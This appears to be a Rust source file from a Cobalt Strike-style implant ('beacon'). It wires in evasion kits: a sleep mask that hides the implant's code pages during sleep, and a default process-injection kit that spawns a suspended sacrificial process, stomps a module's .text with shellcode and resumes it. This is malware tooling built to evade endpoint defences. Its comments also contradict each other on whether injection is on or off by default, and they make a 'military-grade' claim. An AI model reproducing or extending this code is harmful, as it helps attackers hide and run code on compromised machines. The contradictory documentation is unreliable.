//! CS-style "kit" extension contracts — the plug-in points future P2 stealth
//! techniques implement, so they land as trait impls rather than beacon-loop
//! rewrites.
//!
//! Two kits today, both with behavior-preserving no-op defaults:
//! - [`SleepmaskKit`] / [`NoMask`] — sleep obfuscation (Ekko/Foliage is P2).
//! - [`ProcessInjectKit`] / [`NotImpl`] — spawn-to shellcode injection
//!   (module stomping is P2).
//!
//! ## Kit contract (what a third-party impl must satisfy)
//! Each kit is a Rust trait. A build selects an impl by changing the const
//! kit instance below (or a `Configured` alias). The beacon loop / postex
//! paths call through the trait, so swapping an impl changes only the kit
//! instance — never the call sites. A future CS-style `.o` kit bridge would
//! load a COFF object against one of these traits, mirroring `crates/coff` +
//! `bof.rs`.

#![cfg(target_os = "windows")]

// ---- Sleepmask kit -------------------------------------------------------

/// Sleep-obfuscation extension point. The default method is the current
/// behavior (plain indirect-syscall sleep, no masking); an encrypting kit
/// (Ekko/Foliage) overrides it.
pub trait SleepmaskKit {
    /// Own the sleep window: mask the implant image + thread stacks, sleep
    /// ~`seconds`, then FULLY unmask before returning. An Ekko/Foliage impl's
    /// APC timer IS the sleep (it does not call a plain sleep internally), so
    /// the combined mask+sleep+unmask granularity is deliberate — do NOT split
    /// it into separate mask()/unmask() around an external sleep.
    ///
    /// **Invariant a real impl MUST hold**: on return the implant image and
    /// every thread stack are byte-identical to entry. Returning with `.text`
    /// still encrypted (or a stack still XOR'd) crashes on the next instruction.
    fn sleep_masked(&self, seconds: u32);
}

/// Default sleepmask kit: no masking. Delegates to the raw indirect-syscall
/// sleep (`beacon::sleep_seconds`), so behavior is byte-identical to the
/// pre-kit loop. The delegation lives in the impl (not a trait default) so the
/// kit trait never depends back on the beacon module.
pub struct NoMask;
impl SleepmaskKit for NoMask {
    fn sleep_masked(&self, seconds: u32) {
        crate::beacon::sleep_seconds(seconds);
    }
}

/// Fluctuation sleepmask kit: flips .text to PAGE_NOACCESS during sleep,
/// then back to RX on wake. Military-grade — CFG/CET immune, no ROP chains,
/// no RC4 key material. When disabled, falls through to plain NtDelayExecution.
pub struct Foliage;
impl SleepmaskKit for Foliage {
    fn sleep_masked(&self, seconds: u32) {
        crate::fluctuation::sleep(seconds);
    }
}

/// The active sleepmask kit. Foliage masks the image at sleep when armed
/// (ON by default via `foliage_enabled`); if disabled, it's NoMask-equivalent.
const SLEEPMASK_KIT: Foliage = Foliage;

/// Beacon-facing sleep entry. Routes through the configured kit so a future
/// encrypting impl is a one-line kit swap, not a loop edit.
///
/// # Fluctuation gating (sleep-mask wiring)
/// Engages the Foliage fluctuation sleep-mask ONLY when BOTH:
///   (a) the full evasion init ran (`beacon::evasion_active()`) — so `mem::mask`
///       has registered the .text/config/key regions the thunk will flip, AND
///   (b) `fluctuation::enabled()` is true (compile-time `NYX_FLUCTUATION_OFF`
///       plus the runtime `set_enabled` toggle).
/// Otherwise falls through to the plain indirect-syscall sleep. This closes
/// the historical "crashes in noevasion mode" failure: the crash was the thunk
/// trying to unmask regions that `mem::mask()` never registered.
pub fn sleep(seconds: u32) {
    if crate::beacon::evasion_active() && crate::fluctuation::enabled() {
        SLEEPMASK_KIT.sleep_masked(seconds);
    } else {
        crate::beacon::sleep_seconds(seconds);
    }
}

// ---- Process-inject kit --------------------------------------------------

/// Raw Windows `HANDLE` to an injected thread/process. `0` on the not-impl
/// path; a real impl (module stomping, P2) returns the live handle.
#[allow(dead_code)]
pub struct InjectedHandle(pub usize);

/// Spawn-to-shellcode injection extension point (CS ProcessInject kit). The
/// default impl refuses — the production technique (module stomping) is a P2
/// stealth milestone.
pub trait ProcessInjectKit {
    /// Inject `shellcode` into a fresh `spawn_to` process; return a handle on
    /// success. Default: not implemented (returns `None`).
    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
        let _ = (spawn_to, shellcode);
        None
    }
}

/// Default process-inject kit: delegates to `crate::inject::module_stomp`
/// (P2.1c). The stomp+resume tail there is gated (`inject::modulestomp_enabled`,
/// default **ON**), so by default this runs the full module-stomping path —
/// spawn a suspended sacrificial process, stomp a module's `.text` with the
/// shellcode, and resume. The operator can disarm via
/// `set_modulestomp_enabled(false)` if the target requires a no-cross-process
/// footprint, in which case only the suspended sacrificial process handle is
/// returned (no shellcode executed). Kept as a `ProcessInjectKit` impl so the
/// postex `inject()` entry routes through the real data path (CreateProcessW)
/// and the SDK `ModuleStomper` impl stays the single source for the algorithm.
pub struct ModuleStompKit;
impl ProcessInjectKit for ModuleStompKit {
    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
        // SAFETY: single-threaded beacon context. With the stomp gate ON
        // (default) this only creates a suspended process — no shellcode runs.
        let h = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
        Some(InjectedHandle(h))
    }
}

/// The active process-inject kit.
const PROCESS_INJECT_KIT: ModuleStompKit = ModuleStompKit;

/// Postex-facing injection entry. Routes through the active kit
/// (`ModuleStompKit` → `crate::inject::module_stomp`). Returns `None` if
/// CreateProcessW fails (spawn_to missing / blocked); returns a handle to a
/// SUSPENDED sacrificial process otherwise. The actual .text stomp + resume
/// runs only when `inject::modulestomp_enabled` is armed (default OFF) — until
/// then this is the safe data path (no cross-process write/execute).
pub fn inject(spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
    PROCESS_INJECT_KIT.inject(spawn_to, shellcode)
}
